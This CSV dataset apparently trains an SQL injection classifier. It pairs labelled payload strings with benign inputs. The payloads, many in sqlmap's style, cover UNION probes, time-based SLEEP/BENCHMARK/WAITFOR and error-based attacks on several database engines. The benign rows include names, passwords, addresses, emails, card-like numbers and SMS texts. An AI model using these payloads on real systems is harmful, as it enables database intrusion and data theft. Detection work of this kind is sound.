payload,label
"cbHd"") WHERE 3913=3913 OR ELT(3027=3027,SLEEP(5))#",1
franka,0
catwoman,0
harry,0
bouchot betancur,0
From next month get upto 50% More Calls 4 Ur standard network charge 2 activate Call 9061100010 C Wire3.net 1st4Terms PoBox84 M26 3UZ Cost £1.50 min MobcudB more,0
4870628613160341,0
"vUXo'||(SELECT 0x72504848 WHERE 3354=3354 OR (SELECT 6063 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(6063=6063,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'",1
+(SELECT aPQt WHERE 8040=8040 AND 3034=(CODE(113)||CODE(118)||CODE(112)||CODE(113)||CODE(113)||(SELECT CASE 3034 WHEN 3034 THEN CODE(49) ELSE CODE(48) END)||CODE(113)||CODE(106)||CODE(120)||CODE(106)||CODE(113)))+,1
AND (SELECT 1589 FROM (SELECT(SLEEP(5)))YHHy),1
krysta,0
san miguel de abona,0
8288603955421514,0
""" AND 7378=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (7378=7378) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC) AND ""UzQH""=""UzQH",1
")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- evet",1
macoosh3,0
2524414881203627,0
"-3154"" UNION ALL SELECT 4088,4088,4088,4088,4088,4088,4088,4088,4088,4088,4088,4088,4088,4088,4088,4088#",1
"DtRW' WHERE 7951=7951 AND 7734=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",1
1'+(select wpkh where 5842=5842;select sleep(5))+',1
budweiser,0
"c/ la haya, 109 13-d",0
"vyHv))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- NRyU",1
6963,0
leedsutd,0
15953,0
02021976,0
22513,0
47,0
2036710936767005,0
calle fausto fraile 0,0
39313,0
"-4956"")) UNION ALL SELECT 1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170,1170-- hHUc",1
reamonn,0
working,0
menaker,0
"cbHd')) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-9301"") UNION ALL SELECT 9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365,9365-- KfEg",1
isolina,0
"barcelona 149, 5-e",0
"-7342') UNION ALL SELECT 3515,3515,3515,3515,3515,3515,3515,3515,3515,3515,3515,3515,3515-- ZZaM",1
"-3369') UNION ALL SELECT 7948,7948,7948,7948,7948,7948,7948,7948-- Lnmy",1
"vyHv'||(SELECT CHAR(121)||CHAR(110)||CHAR(98)||CHAR(65) WHERE 8528=8528 OR CHAR(98)||CHAR(99)||CHAR(85)||CHAR(69)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4737),0),5000000000),NULL)--",1
3131,0
10,0
"passatge leon, 93 8?a",0
a2b66r5z,0
32358,0
mcilrath,0
O. Guess they both got screwd,0
"'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- uJha",1
"-7087')) AS nRfn WHERE 7339=7339 UNION ALL SELECT 7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339,7339#",1
"-7405 UNION ALL SELECT 8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072,8072-- HHMO",1
"DtRW) AS qfET WHERE 3079=3079 AND CHAR(85)||CHAR(112)||CHAR(68)||CHAR(107)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9820),0),5000000000),NULL)--",1
' WHERE 2443=2443 AND 4843=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (4843=4843) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))-- DXgf,1
indalecio,0
"||(SELECT CHR(118)||CHR(106)||CHR(89)||CHR(87) WHERE 1569=1569 OR 1998=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(112)||CHR(112)||CHR(88),5))||",1
antirreglamentaria,0
"TAAm"")) AND UPDATEXML(4861,CONCAT(0x2e,0x7176707171,(SELECT (ELT(4861=4861,1))),0x716a786a71),5972) AND ((""YgQi"" LIKE ""YgQi",1
sexC` WHERE 5821=5821 AND 9270=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9270=9270) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))-- rRYA,1
bols,0
"aguila s/n, 6-g",0
As a valued customer I am pleased to advise you that following recent review of your Mob No. you are awarded with a £1500 Bonus Prize call 09066364589,0
duffield@telelujo.coop,0
09128,0
"DtRW') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"1""  )  )   as drss where 2077 = 2077 and 7533 = 7533--",1
pavese@euskalcasino.mz,0
"-5552"")) AS qRlr WHERE 4838=4838 OR 9660=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9660=9660) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- Jspt",1
c/ marquesa de vilallonga 53 5f,0
21291,0
eraser,0
"alcalde isidoro enciso, 100 6?g",0
02061984,0
"calle tren, 56 6?d",0
vUXo) AS KMCU WHERE 8662=8662 AND 3587 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (3587=3587) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- KEiI,1
Charlie,0
""") AS glqa WHERE 3487=3487 UNION ALL SELECT NULL,NULL,NULL,NULL-- cvoN",1
halbert,0
8230522127552712,0
"cbHd') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- pjIf",1
7553,0
"-4268' IN BOOLEAN MODE) UNION ALL SELECT 6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488,6488-- Iucq",1
kamber@weat.gd,0
"TAAm' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WpLq",1
DtRW')) AS pgss WHERE 2129=2129 AND 2714=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- hPgw,1
12965,0
lollipop,0
c!huzar,0
"'))) OR 1679=BENCHMARK(5000000,MD5(0x4b416568))#",1
16926,0
"""))) OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(2713=2713,1))),0x716a786a71,0x78))x)) AND (((""dFuq"" LIKE ""dFuq",1
"https://keystrokebiometrics.xyz:443/') AND 5107=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))-- SnBe",1
bigcat,0
"vUXo')));IIF(1529=6265,1,1/0)%16",1
""")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kLCU",1
glazer,0
"-4516)) UNION ALL SELECT 2344,2344,2344,2344,2344,2344#",1
"https://keystrokebiometrics.xyz:443/' AND ELT(3008=3008,SLEEP(5)) OR 'RiqB'='TaRE",1
"sexC')) AND 6070=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)--",1
"')) AND 6749=BENCHMARK(5000000,MD5(0x6b584542)) AND (('BSxR'='BSxR",1
1279724517252177,0
desintegrar,0
)) AND 5226 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (5226=5226) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113))) AND ((5585=5585,1
2243766198035370,0
"'))(SELECT (CASE WHEN (2678=2678) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) ELSE CHAR(67)||CHAR(75)||CHAR(119)||CHAR(77) END) FROM (VALUES(0))) AND (('DhBO' LIKE 'DhBO",1
patricia,0
I'm vivek:)i got call from your number.,0
"-8000""))) UNION ALL SELECT 2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070,2070#",1
tatarin,0
calle nieto 41,0
84881293t,0
-9178' )  or 9779 = 6351,1
"-8238"") UNION ALL SELECT 6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418,6418-- IXME",1
"-5618') OR MAKE_SET(8263=9920,9920) AND ('tczH'='tczH",1
-4595) AS Vlat WHERE 6970=6970 OR 1455=('qvpqq'||(SELECT CASE 1455 WHEN 1455 THEN 1 ELSE 0 END FROM RDB$DATABASE)||'qjxjq')-- VAtH,1
-2773) OR 7990 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7990=7990) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- uWBX,1
5592414895500154,0
"-6364') UNION ALL SELECT 9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363,9363-- xFsz",1
"vyHv`) WHERE 9316=9316 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- xZpw",1
olite,0
"TAAm') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
Ok... But they said i've got wisdom teeth hidden inside n mayb need 2 remove.,0
""")) UNION ALL SELECT NULL,NULL#",1
488u7ra,0
sant juli del llor i bonmat,0
"vyHv"") PROCEDURE ANALYSE(EXTRACTVALUE(3253,CONCAT(0x5c,0x7176707171,(SELECT (CASE WHEN (3253=3253) THEN 1 ELSE 0 END)),0x716a786a71)),1) AND (""kSmR""=""kSmR",1
"sqlmap/1.4.4#stable (http://sqlmap.org)))) OR 9027=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (((4436=4436",1
You aren't coming home between class right? I need to work out and shower!,0
-2936 )  or 6872 = 6872,1
1529,0
"https://keystrokebiometrics.xyz:443/))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
oran,0
jaraba villa,0
2973576986367936,0
"-9770'  )  )   as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
"cbHd' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- sHKv",1
DtRW)) AS DbcR WHERE 2479=2479;SELECT CASE WHEN 8453=1437 THEN 1 ELSE NULL END--,1
"-6733') where 4024=4024 union all select 4024,4024,4024,4024#",1
"https://keystrokebiometrics.xyz:443/"" AND CHAR(99)||CHAR(79)||CHAR(112)||CHAR(82)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9421),0),5000000000),NULL) AND ""PpKV"" LIKE ""PpKV",1
Den only weekdays got special price... Haiz... Cant eat liao... Cut nails oso muz wait until i finish drivin wat lunch still muz eat wat... ,0
"cbHd"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-4087))) UNION ALL SELECT 6109,6109,6109,6109,6109,6109,6109,6109,6109,6109,6109,6109,6109,6109,6109,6109#",1
batobrina.falkenstein@ebs-construcciones.sv,0
-2779) ORDER BY 1-- NzFq,1
26150430m,0
marazuela,0
"-7872) OR (SELECT (CASE WHEN (1186=2156) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,1186) END) FROM DUAL) IS NULL-- CgOL",1
32452,0
04100,0
"1 where 5266=5266 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",1
DtRW||(SELECT CHAR(105)+CHAR(68)+CHAR(119)+CHAR(110) WHERE 6650=6650 WAITFOR DELAY '0:0:5'--,1
atlanta,0
"1);select count(*) from generate_series(1,5000000) and (8997=8997",1
"-6895) AS THKn WHERE 6921=6921 UNION ALL SELECT 6921,6921,6921,6921,6921,6921,6921#",1
miles,0
"https://keystrokebiometrics.xyz:443/) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- skOf",1
"https://keystrokebiometrics.xyz:443/) AS kZbT WHERE 5232=5232 AND CHAR(90)||CHAR(112)||CHAR(84)||CHAR(109)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)--",1
") and 0=benchmark(3000000,MD5(1))%20--,mysql,time,1
) and 0=benchmark(3000000MD5(1))%20%23",1
7860,0
"-1231' UNION ALL SELECT 4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252,4252#",1
"-1924')) AS drTN WHERE 3746=3746 UNION ALL SELECT 3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746,3746#",1
reencar!nacin,0
"sexC"" OR 4675=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- kqAS",1
` WHERE 5919=5919 AND 7767=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 7767 WHEN 7767 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113))-- YTZn,1
"c/ secretario guedes aleman s/n,",0
71814891j,0
"DtRW"")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1
"DtRW UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Ensm",1
""") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
28660,0
disipar,0
"corredoira dos cornos, 175 4-c",0
""" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nELj",1
"sqlmap/1.4.4#stable (http://sqlmap.org)'))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"') WHERE 2434=2434 OR 9747=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--",1
romantic,0
"UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
DtRW OR 2671=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- aWJb,1
"-7642)) AS KAss WHERE 3515=3515 UNION ALL SELECT 3515,3515,3515,3515,3515,3515,3515,3515#",1
t45r97car,0
bernaden,0
37541,0
8185948553220105,0
"sqlmap/1.4.4#stable (http://sqlmap.org)""))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Eaws",1
5abiana,0
nitro,0
cerceda,0
"' WHERE 9031=9031 AND 9511=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--",1
6429,0
"calle don juan de malaga, 170,",0
palmer,0
sqlmap/1.4.4#stable (http://sqlmap.org)' ORDER BY 1#,1
"-5499)) UNION ALL SELECT 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#",1
alcal de la selva,0
feridad,0
ivana,0
"sexC'||(SELECT CHR(105)||CHR(89)||CHR(73)||CHR(85) FROM DUAL WHERE 1337=1337 OR 3347=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5))||'",1
"sexC"")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- yrCE",1
"sqlmap/1.4.4#stable (http://sqlmap.org)) AS EcTp WHERE 7790=7790 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"DtRW')) AND 6312=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(70)||CHR(65)||CHR(90),5)--",1
"-6735) UNION ALL SELECT 4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207,4207#",1
tundra,0
perfeccin,0
hrenyk,0
sexC) AS QcoZ WHERE 4217=4217 OR 9127=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- spmg,1
"sqlmap/1.4.4#stable (http://sqlmap.org)) AND 4927=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- ozdE",1
"-4315""))) UNION ALL SELECT 1698#",1
wanking,0
13061987,0
"sqlmap/1.4.4#stable (http://sqlmap.org)')) AS jPrb WHERE 9640=9640 UNION ALL SELECT NULL,NULL,NULL#",1
"-3440'))) UNION ALL SELECT 5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675,5675#",1
shirleen,0
")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- uuKe",1
robert1,0
"DtRW')) AS HVPo WHERE 2704=2704 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-9502"")) ORDER BY 1564-- BxoN",1
leopolda,0
marine1,0
"sexC`) WHERE 6310=6310 OR CHAR(114)||CHAR(105)||CHAR(105)||CHAR(65)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)-- bXiF",1
"sexC')) AND CHAR(69)||CHAR(108)||CHAR(111)||CHAR(105)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(6952),0),5000000000),NULL) AND (('mLrE' LIKE 'mLrE",1
recordati87,0
1pergamin0da,0
"')) OR 4208=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))--",1
"DtRW') AS SYPE WHERE 6127=6127 AND 3554=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)--",1
"-9823"")) UNION ALL SELECT 8978,8978,8978,8978,8978,8978,8978,8978#",1
vyHv`) WHERE 1573=1573 OR SLEEP(5)-- HVFs,1
31744,0
"vyHv' IN BOOLEAN MODE) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(7666=7666,1))),0x716a786a71,0x78))s), 8446744073709551610, 8446744073709551610)))#",1
jyuo,0
sqlmap/1.4.4#stable (http://sqlmap.org)||(SELECT QeTK WHERE 6271=6271 OR 2644=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR))||,1
"calle levi, 12 2-c",0
76pelacin,0
https://keystrokebiometrics.xyz:443/'))) OR 8148=(SELECT 8148 FROM PG_SLEEP(5)) AND ((('YwjL'='YwjL,1
slick,0
"-3369)) AS ISiI WHERE 2798=2798 UNION ALL SELECT 2798,2798,2798,2798,2798,2798,2798,2798,2798,2798,2798,2798,2798,2798#",1
saviange_files@zytel.nc,0
mikael,0
Tonight? Yeah I'd be down for that,0
"TAAm) AS DarJ WHERE 7065=7065 OR (SELECT 2604 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(2604=2604,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VirX",1
napster,0
")) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
vyHv'||(SELECT (CHR(84)||CHR(68)||CHR(108)||CHR(113)) FROM DUAL WHERE 4042=4042 AND 8333=(SELECT 8333 FROM PG_SLEEP(5))--,1
'||(SELECT (CHR(110)||CHR(84)||CHR(86)||CHR(122)) WHERE 1894=1894 OR NOT 3816=4557)||',1
reinaldo,0
hbil,0
"cbHd"" RLIKE (SELECT 6572 FROM (SELECT(SLEEP(5)))OAnX)#",1
woofer,0
"-6139""))) UNION ALL SELECT 4511,4511,4511,4511,4511,4511,4511,4511,4511#",1
"-1114""))) OR (2912=4028)*4028 AND (((""SxHB"" LIKE ""SxHB",1
Tomorrow i am not going to theatre. . . So i can come wherever u call me. . . Tell me where and when to come tomorrow,0
histri985ent0,0
django,0
budia,0
"calle fernando galvan, 192, 7b",0
clavel_keegan@apelton.gy,0
jahu,0
It only does simple arithmetic not percentages.,0
"sexC+(SELECT 0x6a79486f WHERE 4611=4611 AND EXTRACTVALUE(8963,CONCAT(0x5c,0x7176707171,(SELECT (ELT(8963=8963,1))),0x716a786a71)))+",1
Sad story of a Man - Last week was my b'day. My Wife did'nt wish me. My Parents forgot n so did my Kids . I went to work. Even my Colleagues did not wish. As I entered my cabin my PA said '' Happy B'day Boss !!''. I felt special. She askd me 4 lunch. After lunch she invited me to her apartment. We went there. She said'' do u mind if I go into the bedroom for a minute ? '' ''OK'' I sed in a sexy mood. She came out 5 minuts latr wid a cake...n My Wife My Parents My Kidz My Friends n My Colleagues. All screaming.. SURPRISE !! and I was waiting on the sofa.. ... ..... ' NAKED...!,0
silvino,0
